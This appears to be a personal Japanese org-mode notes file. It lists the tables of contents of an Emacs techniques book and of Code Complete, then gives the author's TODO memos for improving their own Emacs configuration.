 22 ■ 1.1 　コマンド　～ Emacs に命令する
 24 ■ 1.2 　 S 式　～ Emacs Lisp の構成要素を知る
 26 ■ 1.3 　評価　～ Emacs Lisp プログラムを実行する
 28 ■ 1.4 　関数　～前置記法を知る
 29 ■ 1.5 　 M-x ielm 　～ Lisp 式（ S 式）を対話的に評価する
 31 ■ 1.6 　.emacs 　～ Emacs 起動時に自動で読み込むファイルを作成する
 32 ■ 1.7 　 require 　～ Emacs Lisp ファイルをロードする
 34 ■ 1.8 　 M-x byte-compile-file 　～ Emacs Lisp ファイルをバイトコンパイルする
 35 ■ 1.9 　 auto-async-byte-compile.el 　～自動バイトコンパイルをする
 36 ■ 1.10 　 M-x list-load-path-shadows 　～ load-path 優先度問題を解決する
 37 ■ 1.11 　 M-;　～コメントを処理する
 39 ■ 1.12 　 setq 　～変数に値を設定する
 40 ■ 1.13 　 defun 　～関数を定義する
 41 ■ 1.14 　 add-hook 　～特定のタイミングで呼び出される関数を登録する
 43 ■ 1.15 　 C-x C-e 　～テキストに埋め込まれた Emacs Lisp 式を評価する

 45 ■■■ Chapter02 　初期装備に必要な知識
 46 ■本章に入る前の基礎知識
 47 ■ 2.1 　 ddskk 　～日本語入力を行う
 49 ■ 2.2 　 auto-install.el 　～ Emacs Lisp インストーラを利用する
 52 ■ 2.3 　 ELPA 　～パッケージを簡単にインストールする
 53 ■ 2.4 　 sticky.el 　～大文字入力を楽にする
 54 ■ 2.5 　<f1>　～ Emacs に問い合わせする
 56 ■ 2.6 　日本語 info 　～日本語マニュアルを導入する
 57 ■ 2.7 　 info 　～ info ドキュメントを読む


 61 ■■■ Chapter03 　キーバインドについて
 62 ■本章に入る前の基礎知識
 63 ■ 3.1 　キーマップ～押されたキーに対してコマンドを探索する
 65 ■ 3.2 　 Ctrl ＋ 1 文字　～最重要コマンドを覚える
 67 ■ 3.3 　 Meta ＋英小文字　～重要コマンドを覚える
 69 ■ 3.4 　プレフィクスキー　～ 2 ストローク以上のコマンドを覚える
 71 ■ 3.5 　 define-key 　～キーマップを変更する
 73 ■ 3.6 　 define-key 　～ Ctrl ＋ 1 文字に割り当てられるキーを探す
 75 ■ 3.7 　 define-key 　～その他に割り当てられるキーを探す
 76 ■ 3.8 　 sequential-command.el 　～同じコマンドを連続実行したときの振舞いを変更する
 78 ■ 3.9 　 key-chord.el 　～キーボード同時押しでコマンドを実行する
 79 ■ 3.10 　 minor-mode-hack.el 　～マイナーモード衝突問題を解決する


 81 ■■■ Chapter04 　バッファ・ファイルを扱う
 82 ■本章に入る前の基礎知識
 83 ■ 4.1 　 ffap.el 　～現在位置のファイル・ URL を開く
 84 ■ 4.2 　 uniquify.el 　～ファイル名がかぶった場合にバッファ名をわかりやすくする
 85 ■ 4.3 　 iswitchb.el 　～バッファ切り替えを強化する
 87 ■ 4.4 　 recentf.el 　～最近使ったファイルを開く
 89 ■ 4.5 　 bookmark.el 　～ファイル内の特定の位置をブックマークする
 91 ■ 4.6 　 emacsclient 　～シェルから現在の Emacs にアクセスする
 93 ■ 4.7 　 tempbuf.el 　～使わないバッファを自動的に消す
 94 ■ 4.8 　 auto-save-buffers.el 　～ファイルを自動保存する
 95 ■ 4.9 　 C-x v v 　～バージョン管理システムに登録する
 97 ■ 4.10 　 C-x v =， C-x v u 　～バージョン管理システムで変更点を調べる・取り消す
 98 ■ 4.11 　 C-x v l 　～バージョン管理システムで変更履歴を見る
100 ■ 4.12 　 C-x C-f ， C-x d 　～ファイルリストからファイルを操作する
102 ■ 4.13 　 wdired.el 　～ディレクトリ内のファイル名を自由自在に編集する
103 ■ 4.14 　 tramp.el 　～リモートマシンのファイルに透過的にアクセスする
104 ■ 4.15 　 sudoedit 　～ root 権限でファイルを編集する


105 ■■■ Chapter05 　カーソル移動
106 ■本章に入る前の基礎知識
107 ■ 5.1 　文字・単語・行・文単位の移動　～矢印キーを使わずにカーソルを移動する
108 ■ 5.2 　 M-x transient-mark-mode 　～リージョンに色をつける
110 ■ 5.3 　 screen-lines.el 　～見かけの行でカーソルを移動する
111 ■ 5.4 　 C-s ， C-r 　～インクリメンタルサーチで対象文字列の位置にカーソル移動する
113 ■ 5.5 　 migemo.el 　～ローマ字のまま日本語をインクリメンタルサーチする
115 ■ 5.6 　 point-undo.el 　～カーソル位置を戻す
116 ■ 5.7 　 bm.el 　～カーソル位置に目に見える印をつける
117 ■ 5.8 　 goto-chg.el 　～最後の変更箇所にジャンプする


119 ■■■ Chapter06 　入力支援
120 ■本章に入る前の基礎知識
122 ■ 6.1 　 autoinsert.el 　～ファイル作成時にテンプレートを挿入する
123 ■ 6.2 　 redo.el 　～「やり直し」をカイゼンする
124 ■ 6.3 　 sense-region.el 　～矩形を選択しやすくする
126 ■ 6.4 　 M-/ 　～バッファから単語を補完する（動的略語展開）
127 ■ 6.5 　 yasnippet.el 　～略語から定型文を入力する
129 ■ 6.6 　 yasnippet.el 　～スニペットを定義する
132 ■ 6.7 　 yasnippet.el 　～スニペットを展開するコマンドを定義する
133 ■ 6.8 　 yasnippet.el 　～新規作成ファイルに自動でスニペットを展開する
134 ■ 6.9 　 yasnippet.el 　～スニペットをその場で定義して使う
136 ■ 6.10 　 M-x hippie-expand 　～略語展開・補完を行うコマンドをまとめる
138 ■ 6.11 　<f3>，<f4>　～キーボードマクロで操作を自動化する
140 ■ 6.12 　 M-x kmacro-save 　～キーボードマクロをコマンド化する
142 ■ 6.13 　再帰編集　～コマンド実行中に新たなコマンドを実行する
143 ■ 6.14 　 auto-complete.el 　～ IDE のような入力支援をする


145 ■■■ Chapter07 　検索・置換
146 ■本章に入る前の基礎知識
148 ■ 7.1 　 M-x re-builder 　～正規表現を対話的に作成する
149 ■ 7.2 　 M-x occur 　～バッファ内で正規表現にマッチする行を出力する
150 ■ 7.3 　 M-s o (isearch-occur) 　～インクリメンタルサーチからマッチ行一覧を作成する
151 ■ 7.4 　 M-%　～文字列を置換する
153 ■ 7.5 　 C-M-%　～正規表現置換をする
155 ■ 7.6 　 color-moccur.el 　～バッファ内（複数可）を検索する
157 ■ 7.7 　 moccur-edit.el 　～ color-moccur.el の結果を編集する
159 ■ 7.8 　 M-x grep 　～ grep プログラムの実行結果に飛ぶ
161 ■ 7.9 　 igrep.el 　～ grep のコマンドラインを打たずに grep 検索する
162 ■ 7.10 　 grep-a-lot.el 　～複数の*grep*バッファを使う
163 ■ 7.11 　 grep-edit.el 　～ grep 検索結果を編集する


165 ■■■ Chapter08 　 Emacs をもっと便利に
166 ■本章に入る前の基礎知識
167 ■ 8.1 　 col-highlight.el 　～現在桁をハイライトする
169 ■ 8.2 　 M-x highlight-regexp 　～正規表現にマッチした部分を自動ハイライトする
170 ■ 8.3 　 M-x follow-mode 　～ワイドディスプレイを有効活用する
171 ■ 8.4 　 w3m.el (emacs-w3m) 　～ Web ブラウザとして利用する
173 ■ 8.5 　 twittering-mode.el 　～ twitter を利用する
175 ■ 8.6 　 gist.el 　～ gist.github.com を利用する
176 ■ 8.7 　 navi2ch.el 　～ 2 ちゃんねるブラウザを利用する
178 ■ 8.8 　 rcirc.el 　～シンプルな IRC クライアントを利用する
179 ■ 8.9 　 yaoddmuse.el 　～ EmacsWiki を編集する
181 ■ 8.10 　 yaoddmuse.el 　～ Emacs Lisp ファイルを EmacsWiki にアップロードする
182 ■ 8.11 　 EmacsWiki svn リポジトリ　～ EmacsWiki のリポジトリを丸ごと取得する
184 ■ 8.12 　 M-x customize-group 　～ GUI で変数・フェイスをカスタマイズする



187 ■■■ Chapter09 　外部プログラム
188 ■本章に入る前の基礎知識
189 ■ 9.1 　 M-x shell 　～ Emacs でシェルを動かす
191 ■ 9.2 　 M-x dired-do-shell-command 　～ dired からシェルコマンドを実行する
192 ■ 9.3 　 M-! ， M-|　～シェルコマンドの実行結果を表示・貼り付けする
194 ■ 9.4 　 multi-shell.el 　～複数の shell バッファを利用する
195 ■ 9.5 　 M-x compile 　～ Emacs の中でコンパイラを動かす
196 ■ 9.6 　 M-x executable-interpret 　～スクリプトを実行する
197 ■ 9.7 　 M-x diff 　～ 2 つのファイルの相異点を出力する
198 ■ 9.8 　 shell-history.el 　～ Emacs 内のシェルコマンド実行履歴を保存する
199 ■ 9.9 　 multi-term.el 　～ Emacs で端末エミュレータを利用する


201 ■■■ Chapter10 　テキスト整形／テキスト処理
202 ■本章に入る前の基礎知識
203 ■ 10.1 　 text-adjust.el 　～日本語の文章を整形する
205 ■ 10.2 　 M-x sort-lines 　～行をソートする
207 ■ 10.3 　 C-x r t ， C-x r k ， C-x r d 　～引用マークを付けたり外したりする
208 ■ 10.4 　 boxes 　～コメントを目立たせる・装飾する
210 ■ 10.5 　 M-x align 　～桁揃えをする


213 ■■■ Chapter11 　 view-mode を徹底活用
214 ■本章に入る前の基礎知識
216 ■ 11.1 　 C-x C-r 　～ view-mode でファイルを開く
217 ■ 11.2 　 C-x C-q 　～ view-mode を有効・無効にする
218 ■ 11.3 　 define-key 　～ view-mode のキー割り当てを変更する
219 ■ 11.4 　 viewer.el 　～書き込み不能なファイルで view-mode から抜けないようにする
220 ■ 11.5 　 viewer.el 　～ view-mode のときに mode-line に色をつける
221 ■ 11.6 　 viewer.el 　～メジャーモードに合わせて view-mode のキーバインドを設定する
222 ■ 11.7 　 viewer.el 　～特定のファイル・すべてのファイルを view-mode で開く


223 ■■■ Chapter12 　 Emacs Lisp プログラミング支援
224 ■本章に入る前の基礎知識
225 ■ 12.1 　 C-M-f ， C-M-b ， C-M-d ， C-M-u ， C-M-SPC ， C-M-k ， C-M-t 　～ S 式・リストを編集する
227 ■ 12.2 　 C-M-a ， C-M-e ， C-M-h 　～関数間を移動・関数をマークする
228 ■ 12.3 　 paredit.el 　～括弧の対応を取りながら S 式を編集する
231 ■ 12.4 　 eldoc.el 　～ Emacs Lisp 関数・変数のヘルプをエコーエリアに表示する
232 ■ 12.5 　 C-x F ， C-x K ， C-x V 　～関数定義へジャンプする
233 ■ 12.6 　 usage-memo.el 　～*Help*バッファにメモを書き込めるようにする
234 ■ 12.7 　 M-x apropos 　～正規表現にマッチする変数名・関数名・フェイスを探す
236 ■ 12.8 　 M-x apropos-value 　～値にマッチする変数名を検索する
237 ■ 12.9 　 M-x apropos-documentation 　～ドキュメントにマッチするシンボルを検索する
238 ■ 12.10 　 M-x apropos-library 　～ライブラリの定義内容を知る
239 ■ 12.11 　 lispxmp.el 　～ Emacs Lisp 式の値をコメントで注釈する
240 ■ 12.12 　 edit-list.el 　～リスト変数の内容を編集する
241 ■ 12.13 　 el-expectations.el 　～ユニットテストを書く
243 ■ 12.14 　 batch-byte-compile 　～コマンドラインからバイトコンパイルする


245 ■■■ Chapter13 　プログラミング／文書作成支援
246 ■本章に入る前の基礎知識
247 ■ 13.1 　 open-junk-file.el 　～使い捨てのファイルを開く
248 ■ 13.2 　 summarye.el 　～バッファのサマリを表示する
250 ■ 13.3 　 text-translator.el 　～言語を自動判別して複数の Web 翻訳サービスを同時に使う
251 ■ 13.4 　 html-fold.el 　～ HTML ・ XML の要素を隠して見栄えをよくする
253 ■ 13.5 　 M-x ediff-files 　～ 2 つのファイルの相異点をハイライトする・取り込む
255 ■ 13.6 　 M-x ediff-merge-files 　～ 2 つのファイルをマージしたファイルを作成する
256 ■ 13.7 　 hideif.el 　～ C 言語のプリプロセッサを隠す
257 ■ 13.8 　 hideshow.el 　～ブロックを折畳む
258 ■ 13.9 　 M-x imenu 　～現在のファイルにある関数定義にジャンプする（言語非依存）
259 ■ 13.10 　 M-x which-func-mode 　～現在の関数名を常に表示する
260 ■ 13.11 　 M-x flymake-mode 　～リアルタイムにプログラミング言語の文法チェックをする
262 ■ 13.12 　 ipa.el 　～ファイルに直接書き込まずにメモをする
264 ■ 13.13 　 multiverse.el 　～ファイルのスナップショットを取る
265 ■ 13.14 　 M-.　～タグファイルを使って関数定義へジャンプする（言語非依存）
267 ■ 13.15 　 gtags.el 　～ GNU GLOBAL でソースコード解析を楽にする
269 ■ 13.16 　 fold-dwim.el 　～複数の折畳み・展開コマンドに統一的なインターフェースを提供する


271 ■■■ Chapter14 　 org-mode 　～統合文書作成環境
272 ■本章に入る前の基礎知識
274 ■ 14.1 　 M-RET ，<M-left>，<M-right>　～見出し・項目を入力する
275 ■ 14.2 　 M-x org-insert-heading-dwim 　～ 1 階層下・上の見出し・項目を入力する
276 ■ 14.3 　<M-up>，<M-down>　～行・見出し・リストを移動する
277 ■ 14.4 　 M-x org-remember 　～瞬時にメモを取る
280 ■ 14.5 　「|」， TAB 　～表を作成する
282 ■ 14.6 　 C-c C-t ，<S-up>，<S-down>　～ TODO リストを作成する
284 ■ 14.7 　 C-c C-s ， C-c C-d 　～予定日時、締切日時を設定する
286 ■ 14.8 　 C-c C-q ， C-c C-c ， C-c / T 　～タグを作成・検索する
288 ■ 14.9 　 C-c l ， C-c C-l 　～ハイパーリンクを作成する・辿る
291 ■ 14.10 　*bold* /italic/ _underline_ =code= +del+ 　～文書を装飾する
292 ■ 14.11 　「:」，#+BEGIN_EXAMPLE ～#+END_EXAMPLE 　～そのまま出力する
293 ■ 14.12 　 [/] ， [ ] ， C-c C-c 　～チェックリストを作成する
294 ■ 14.13 　#+INCLUDE:　～別なファイルを取り込む
295 ■ 14.14 　 C-c a 　～予定表を見る
298 ■ 14.15 　 C-c C-e 　～ HTML に変換する


301 ■■■ Chapter15 　 anything.el 　～すべてを統べるものとその仲間たち
302 ■本章に入る前の基礎知識
306 ■ 15.1 　<f1> m 　～ヘルプで使い方を覚える
307 ■ 15.2 　 C-p ， C-n ， RET ， C-v ， M-v 　～オブジェクトを選択する
309 ■ 15.3 　 RET ， TAB ， C-e ， C-j 　～アクションを実行する
310 ■ 15.4 　<left>，<right>， C-o 　～複数の情報源を扱う
311 ■ 15.5 　 M-x anything-for-files 　～ファイルを開くコマンドをまとめる
314 ■ 15.6 　 C-z （継続アクション）　～ anything バッファを閉じずにアクションを実行する
315 ■ 15.7 　 M-x anything-resume 　～直前の anything セッションを復元する
316 ■ 15.8 　 M-x anything-execute-anything-command 　～設定済み anything を試す
318 ■ 15.9 　 M-x anything-call-source 　～情報源を試す
319 ■ 15.10 　 descbinds-anything.el 　～キーバインドを調べる
321 ■ 15.11 　 M-x anything-complete-shell-history 　～シェルコマンドの履歴から補完
322 ■ 15.12 　 M-x anything-apropos 　～コマンド名・関数名・変数名・フェイス名検索をする
323 ■ 15.13 　 M-x anything-show-kill-ring 　～過去の kill-ring の内容を取り出す
324 ■ 15.14 　 M-x anything-lisp-complete-symbol-partial-match 　～ Emacs Lisp シンボルを補完する
325 ■ 15.15 　 M-x anything-grep 　～ grep 結果をさらに絞り込む
326 ■ 15.16 　 anything-c-moccur.el 　～インクリメンタルサーチと occur を合体する
328 ■ 15.17 　 C-c C-u 　～候補を再計算する
329 ■ 15.18 　 anything-other-buffer 　～ anything コマンドを定義する
331 ■ 15.19 　変数　～ anything をチューニングする


333 ■■■ Chapter16 　 anything.el プログラミング
334 ■本章に入る前の基礎知識
339 ■ 16.1 　 type 　～オブジェクトの型を宣言して情報源を作成する
341 ■ 16.2 　 init 　～情報源の初期化をする
342 ■ 16.3 　 candidates-in-buffer 　～バッファの行から情報源を作成する
345 ■ 16.4 　 candidates-file 　～ファイルの行から情報源を作成する
346 ■ 16.5 　 grep-candidates 　～ファイルの行から情報源を作成する（高速版）
347 ■ 16.6 　 candidates ， display-to-real ， real-to-display 　～候補の見た目を変更する
349 ■ 16.7 　 candidate-transformer ， filtered-candidate-transformer 　～候補全体を加工する
351 ■ 16.8 　 header-name 　～ヘッダを変更する
352 ■ 16.9 　 delayed ， requires-pattern 　～処理時間のかかる情報源を作成する
354 ■ 16.10 　 volatile 　～入力のたびに candidates 関数を実行する
355 ■ 16.11 　 persistent-action 　～継続アクションを指定する
357 ■ 16.12 　 anything-candidate-number-limit ， candidate-number-limit 　～候補数を変更する
358 ■ 16.13 　 dummy 　～パターンをそのまま候補にする
359 ■ 16.14 　 multiline 　～複数行にわたる候補を使う
361 ■ 16.15 　 type:line 　～特定の行番号へジャンプする情報源を作成する
362 ■ 16.16 　 headline 　～正規表現にマッチする行を出力する情報源を作成する
364 ■ 16.17 　 type:file-line 　～特定のファイルの行番号へジャンプする情報源を作成する
365 ■ 16.18 　 anything-marked-candidates 　～マークされた候補を得る
366 ■ 16.19 　 anything 　～ anything の呼び出し方を細かく制御する
367 ■ 16.20 　 anything-test-candidates 　～情報源をテストする
369 ■ 16.21 　 anything-debug-forms 　～デバッグをする
370 ■ 16.22 　 anything-attr ， anything-attrset ， anything-attr-defined 　～属性の値を参照・設定する
373 ■ 16.23 　 anything-compile-source-functions 　～ anything プラグインを作成する


375 ■■索引
380 ■■逆引き索引
***** code compile
■上巻

『 Code Complete 』への賛辞
はじめに

第 1 部　基礎を固める

　第 1 章　ソフトウェアコンストラクションへようこそ
　　 1.1 ソフトウェアコンストラクションとは
　　 1.2 なぜソフトウェアコンストラクションは重要か
　　 1.3 本書の読み方
　　 1.4 まとめ

　第 2 章　ソフトウェア開発への理解を深めるメタファ
　　 2.1 メタファの重要性
　　 2.2 ソフトウェアメタファの使用法
　　 2.3 一般的なソフトウェアメタファ
　　 2.4 参考資料
　　 2.5 まとめ

　第 3 章　 2 回測って、 1 度で切る：上流工程の必要性
　　 3.1 準備の重要性
　　 3.2 ソフトウェアの種類の特定
　　 3.3 準備：課題定義
　　 3.4 準備：要求
　　 3.5 準備：アーキテクチャ
　　 3.6 上流工程にかける時間
　　 3.7 参考資料
　　 3.8 まとめ

　第 4 章　コンストラクションの重要な決断
　　 4.1 プログラミング言語の選択
　　 4.2 プログラミング規約
　　 4.3 テクノロジの波に乗って
　　 4.4 主なコンストラクションプラクティス
　　 4.5 まとめ

第 2 部　高品質なコードの作成

　第 5 章　コンストラクションにおける設計
　　 5.1 設計の難題
　　 5.2 重要な設計概念
　　 5.3 構成要素の設計：ヒューリスティクス
　　 5.4 設計のプラクティス
　　 5.5 一般的な手法へのコメント
　　 5.6 参考資料
　　 5.7 まとめ

　第 6 章　クラスの作成
　　 6.1 クラスの基礎：抽象データ型（ ADT ）
　　 6.2 良いクラスインターフェイス
　　 6.3 設計と実装の問題
　　 6.4 クラスを作成する理由
　　 6.5 言語固有の問題
　　 6.6 クラスを超えて：パッケージ
　　 6.7 参考資料
　　 6.8 まとめ

　第 7 章　高品質なルーチン
　　 7.1 ルーチンを作成する理由
　　 7.2 ルーチンレベルでの設計
　　 7.3 良いルーチン名
　　 7.4 ルーチンの長さ
　　 7.5 ルーチンの引数の使用
　　 7.6 関数の使用に関する注意点
　　 7.7 マクロルーチンとインラインルーチン
　　 7.8 まとめ

　第 8 章　防御的プログラミング
　　 8.1 無効な入力への防御
　　 8.2 アサーション
　　 8.3 エラー処理テクニック
　　 8.4 例外
　　 8.5 バリケードによるエラーの被害の囲い込み
　　 8.6 デバッグエイド
　　 8.7 製品コードに防御的プログラミングをどれくらい残すか
　　 8.8 防御的プログラミングに対する防御
　　 8.9 参考資料
　　 8.10 まとめ

　第 9 章　擬似コードによるプログラミング
　　 9.1 クラスとルーチンの作成手順の概要
　　 9.2 擬似コードプログラミングプロセス（ PPP ）
　　 9.3 PPP を使ったルーチンの作成
　　 9.4 PPP 以外の方法
　　 9.5 まとめ

第 3 部　変数

　第 10 章　変数の使用
　　 10.1 データリテラシー
　　 10.2 変数宣言のガイドライン
　　 10.3 変数の初期化のガイドライン
　　 10.4 スコープ
　　 10.5 永続性
　　 10.6 バインディングタイム
　　 10.7 データ型と制御構造の関係
　　 10.8 1 つの目的に 1 つの変数
　　 10.9 まとめ

　第 11 章　変数名の力
　　 11.1 良い名前を選択するために
　　 11.2 特殊なデータの命名
　　 11.3 命名規則の力
　 　 11.4 略式の命名規則
　　 11.5 標準のプレフィックス
　　 11.6 短くて読みやすい名前の作成
　　 11.7 避けるべき名前
　　 11.8 まとめ

　第 12 章　基本的なデータ型
　　 12.1 数値全般
　　 12.2 整数
　　 12.3 浮動小数点数
　　 12.4 文字と文字列
　　 12.5 ブール変数
　　 12.6 列挙型
　　 12.7 名前付き定数
　　 12.8 配列
　　 12.9 ユーザー定義型の作成（型のエイリアス）
　　 12.10 まとめ
　　
　第 13 章　特殊なデータ型
　　 13.1 構造体
　　 13.2 ポインタ
　　 13.3 グローバルデータ
　　 13.4 参考資料
　　 13.5 まとめ

第 4 部　ステートメント

　第 14 章　ストレートなコードの構成
　　 14.1 順序が重要なステートメント
　　 14.2 順序が重要でないステートメント
　　 14.3 まとめ

　第 15 章　条件文の使用
　　 15.1 if 文
　　 15.2 case 文
　　 15.3 まとめ

　第 16 章　ループの制御
　　 16.1 ループの種類の選択
　　 16.2 ループの制御
　　 16.3 ループの作成─ 内から外へ
　　 16.4 ループと配列の対応付け
　　 16.5 まとめ

　第 17 章　特殊な制御構造
　　 17.1 ルーチンからの複数の return 文
　　 17.2 再帰
　　 17.3 goto 文
　　 17.4 特殊な制御構造の展望
　　 17.5 参考資料
　　 17.6 まとめ

　第 18 章　テーブル駆動方式
　　 18.1 テーブル駆動方式の概論
　　 18.2 直接アクセステーブル
　　 18.3 インデックスアクセステーブル
　　 18.4 段階型アクセステーブル
　　 18.5 テーブル参照のその他の例
　　 18.6 まとめ

　第 19 章　制御構造の問題
　　 19.1 論理式
　　 19.2 複合文（ブロック）
　　 19.3 null 文
　　 19.4 危険なほど深いネストの回避
　　 19.5 プログラミングの基礎：構造化プログラミング
　　 19.6 制御構造と複雑さ
　　 19.7 まとめ参考文献

索引
著者紹介

■下巻

『 Code Complete 』への賛辞
はじめに

第 5 部　コードの改良

　第 20 章　ソフトウェアの品質
　　 20.1 ソフトウェアの品質特性
　　 20.2 ソフトウェアの品質改善技術
　　 20.3 ソフトウェアの品質改善技術の相対的な効果
　　 20.4 品質保証はいつ行うか
　　 20.5 ソフトウェア品質の原則
　　 20.6 参考資料
　　 20.7 まとめ

　第 21 章　コラボレーティブコンストラクション
　　 21.1 コラボレーティブ開発プラクティスの概要
　　 21.2 ペアプログラミング
　　 21.3 公式なインスペクション
　　 21.4 その他のコラボレーティブ開発プラクティス
　　 21.5 コラボレーティブコンストラクションテクニックの比較
　　 21.6 参考資料
　　 21.7 まとめ

　第 22 章　デベロッパーテスト
　　 22.1 ソフトウェア品質におけるデベロッパーテストの役割
　　 22.2 デベロッパーテストへの推奨アプローチ
　　 22.3 テストの知恵袋
　　 22.4 典型的なエラー
　　 22.5 テストサポートツール
　　 22.6 テストの改善
　　 22.7 テスト記録の保管
　　 22.8 参考資料
　　 22.9 まとめ

　第 23 章　デバッグ
　　 23.1 デバッグの概要
　　 23.2 欠陥の検出
　　 23.3 欠陥の修正
　　 23.4 デバッグの心理学的考察
　　 23.5 デバッグツール
　　 23.6 参考資料
　　 23.7 まとめ

　第 24 章　リファクタリング
　　 24.1 ソフトウェアの進化の種類
　　 24.2 リファクタリング概論
　　 24.3 リファクタリングの詳細
　　 24.4 安全なリファクタリング
　　 24.5 リファクタリング戦略
　　 24.6 参考資料
　　 24.7 まとめ

　第 25 章　コードチューニング戦略
　　 25.1 パフォーマンスの概要
　　 25.2 コードチューニング入門
　　 25.3 脂肪や糖蜜の類
　　 25.4 測定
　　 25.5 繰り返し
　　 25.6 コードチューニング手法のまとめ
　　 25.7 参考資料
　　 25.8 まとめ

　第 26 章　コードチューニングテクニック
　　 26.1 ロジック
　　 26.2 ループ
　　 26.3 データ変換
　　 26.4 式
　　 26.5 ルーチン
　　 26.6 低水準言語への書き換え
　　 26.7 物事は変わったように見えても、実は変わっていない
　　 26.8 参考資料
　　 26.9 まとめ

第 6 部　システムの考察

　第 27 章　プログラムサイズが及ぼす影響
　　 27.1 コミュニケーションとチームの人数
　　 27.2 プロジェクトの規模の範囲
　　 27.3 プロジェクトの規模がエラーに及ぼす影響
　　 27.4 プロジェクトの規模が生産性に及ぼす影響
　　 27.5 プロジェクトの規模が開発作業に及ぼす影響
　　 27.6 参考資料
　　 27.7 まとめ

　第 28 章　コンストラクションの管理
　　 28.1 良いコーディングの奨励
　　 28.2 構成管理
　　 28.3 コンストラクションスケジュールの見積もり
　　 28.4 測定
　　 28.5 プログラマは人間である
　　 28.6 管理者の管理
　　 28.7 参考資料
　　 28.8 まとめ

　第 29 章　統合
　　 29.1 統合手法の重要性
　　 29.2 統合の頻度― フェーズ型とインクリメンタル型
　　 29.3 インクリメンタル統合戦略
　　 29.4 デイリービルドとスモークテスト
　　 29.5 参考資料
　　 29.6 まとめ

　第 30 章　プログラミングツール
　　 30.1 設計ツール
　　 30.2 ソースコードのツール
　　 30.3 実行可能コードのツール
　　 30.4 ツール指向の環境
　　 30.5 独自のプログラミングツールの作成
　　 30.6 ツールの理想郷
　　 30.7 参考資料
　　 30.8 まとめ

第 7 部　ソフトウェア職人気質とは

　第 31 章　レイアウトとスタイル
　　 31.1 レイアウトの基本
　　 31.2 レイアウトテクニック
　　 31.3 レイアウトスタイル
　　 31.4 制御構造のレイアウト
　　 31.5 ステートメントのレイアウト
　　 31.6 コメントのレイアウト
　　 31.7 ルーチンのレイアウト
　　 31.8 クラスのレイアウト
　　 31.9 参考資料
　　 31.10 まとめ

　第 32 章　読めばわかるコード
　　 32.1 外部ドキュメント
　　 32.2 ドキュメントとしてのプログラミングスタイル
　　 32.3 コメントを入れるか入れないか
　　 32.4 効果的なコメントのポイント
　　 32.5 コメントテクニック
　　 32.6 IEEE 規格
　　 32.7 参考資料
　　 32.8 まとめ

　第 33 章　個人の資質
　　 33.1 個人の資質は話題からずれているか
　　 33.2 知性と謙虚さ
　　 33.3 好奇心
　　 33.4 知的な誠実さ
　　 33.5 コミュニケーションとコラボレーション
　　 33.6 創造性と規律
　　 33.7 怠惰
　　 33.8 気にするほどのことはない資質
　　 33.9 習慣
　　 33.10 参考資料
　　 33.11 まとめ

　第 34 章　ソフトウェア職人気質とは
　　 34.1 複雑さの克服
　　 34.2 プロセスの選択
　　 34.3 人間が 1 番、コンピュータは 2 番
　　 34.4 言語の中へのプログラミング
　　 34.5 集中力を助ける規約
　　 34.6 問題領域に立ったプログラム
　　 34.7 落石注意
　　 34.8 反復、その繰り返し
　　 34.9 汝、ソフトウェアと信仰を結び付けることなかれ
　　 34.10 まとめ

　第 35 章　さらに情報を得るには
　　 35.1 ソフトウェアコンストラクションに関する情報
　　 35.2 コンストラクション以外のトピック
　　 35.3 定期刊行物
　　 35.4 ソフトウェア開発者の読書計画
　　 35.5 専門団体への参加

参考文献
索引
著者紹介

*** memo
**** TODO [#C] list-load-path-shadows の重複している file を削除

***** 結果
***** 背景 (問題点)
	  list-load-path-shadows を実行すると
      /usr/share/emacs23/site-lisp/ 以下の file が重複している
      為改善する
***** 対応方法
	  remove
***** 優先順位の根拠
	  起動に係るので慎重に
	  起動速度が遅くなっている可能性がある
***** 備考
***** time/ref
<2012-11-06 Tue> / cf.

**** TODO [#B] duplicate-line で yank-pop する

     1) 結果
     2) 背景 (問題点)
	    duplicate-line で挿入した後、編集するためにコピーして
        おいた物が yank できない。
     3) 対応方法
	    duplicate-line に defadvice する。
     4) 優先順位の根拠
	    よく使う為。
     5) 備考
     6) time/ref
        <2012-11-12 Mon> / cf. [[file:~/.emacs.d/init/test_init.el]]

**** TODO [#C] 閉括弧で indent

     1) 結果
     2) 背景 (問題点)
	    閉括弧の後に indent していることがる。
     3) 対応方法
	    self-insert を使って関数を作成
     4) 優先順位の根拠
	    容易。緊急性なし。
     5) 備考
     6) time/ref
        <2012-11-12 Mon> / cf. [[file:~/.emacs.d/elisp/mylisp/windmove-or-split.el::windmove%20down][file:~/.emacs.d/elisp/mylisp/windmove-or-split.el::windmove down]]

**** TODO [#C] 同じ様な入力内容を学習する

     1) 結果
     2) 背景 (問題点)
	    関数などで同じ様な内容を入力することが多々あるので学習
        し auto-complete や yasnippet に反映し入力を楽にする。
	    しかし、同じような入力内容の時点でコードとしては冗長で
        あり、見直す必要があるかもしれない
     3) 対応方法
	    dmacro.el defferd.el などから参考
     4) 優先順位の根拠
	    かなり困難かと。
     5) 備考
     6) time/ref
        <2012-11-12 Mon> / cf. [[file:~/work/emacs23-23.1%2B1/lisp/winner.el][file:~/work/emacs23-23.1+1/lisp/winner.el]]

**** TODO [#C] backspace を入力しているタイミングを統計

     1) 結果
     2) 背景 (問題点)
	    backspace = 間違いの訂正なので無駄が発生しているところ。
	    無くすことで少しでも効率化したい。
     3) 対応方法
	    keylogger
     4) 優先順位の根拠
	    緊急性はない
     5) 備考
     6) time/ref
        <2012-11-12 Mon> / cf. [[file:~/mydoc/memo/memo.org::*memo][memo]]

**** TODO [#B] C-x C-e で eval-region

     1) 結果
     2) 背景 (問題点)
        M-x から呼ぶのが面倒
     3) 対応方法
        region があるかどうか判断して行う
     4) 優先順位の根拠
        導入は簡単かつ便利
     5) 備考
     6) time/ref
        <2012-11-16 Fri> / cf. [[file:~/.emacs.d/init/test_init.el::save%20excursion][file:~/.emacs.d/init/test_init.el::save excursion]
*** TODO [0/0] Emacs Architect
**** 1. Introduction
***** 1.1. Policy
****** 1.1.1. この文書について
******* TODO [#C] simple に記載する。
誰が見ても容易に理解できるように。

1) 結果

2) 背景 (問題点)
   時間が経過すると自分が書いた文書でも読むのが苦痛になっているケースがある。

3) 対応方法
   文書を何度も見直し、訂正。

4) 優先順位の根拠
   環境の構築の方が優先。
   完全な文章はない。
   開発途中で変更などがあるので文章の完成は最後になる。

5) 備考

6) time/ref

****** 1.1.2. Purpose
******* TODO [#C] 簡単にこの文章を参照、編集できるようにする。

1) 結果

2) 背景 (問題点)
   設定や拡張時の目的、基準を明確化。
   良質の物を構築する為に、意思決定の判断材料とする。
   基準が明確でないことは必要性の有無が曖昧になる。
   また、時間を浪費する。
